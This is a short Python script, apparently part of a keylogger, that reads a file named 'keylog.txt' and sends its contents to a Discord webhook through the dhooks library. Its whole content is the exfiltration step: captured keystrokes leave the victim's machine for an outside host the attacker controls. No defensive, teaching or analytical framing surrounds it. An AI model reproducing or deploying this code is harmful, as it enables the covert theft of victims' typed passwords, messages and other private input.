from dhooks import Webhook


webhook = Webhook ("https://discord.com/api/webhooks/")

with open("keylog.txt", "r") as file:
    content = file.read()

#data = "hello world test!"

webhook.send(content)



